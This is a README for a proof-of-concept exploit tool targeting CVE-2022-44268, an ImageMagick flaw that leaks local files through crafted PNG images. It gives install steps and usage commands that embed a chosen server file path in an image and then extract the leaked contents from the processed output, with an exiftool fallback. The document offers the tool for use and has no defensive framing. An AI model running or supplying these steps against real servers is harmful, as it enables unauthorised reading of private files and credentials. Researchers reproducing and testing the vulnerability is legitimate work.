# Fixed version of CVE-2022-44268

Some PoCs don't work for specific file contents. This PoC may work for contents that don't work with other PoCs.

# Installation
Git clone this repo. Then, install the requirements.
```sh
pip install -r requirements.txt
```

# Usage
To embed your payload within an image:
```sh
python3 MagickPNG.py -i <image to modify> -f <file to read> -o <output file>
```

> Then use ImageMagick to update your PNG.

To extract data from the ImageMagick modified file:
```sh
python3 MagickPNG.py -d <resulting image> -o <output file>
```

If this doesnt work, try using exiftool to extract the bytes as hex.
```sh
exiftool -all:all -s image.png -b
```

### original poc:
[here](https://github.com/kljunowsky/CVE-2022-44268)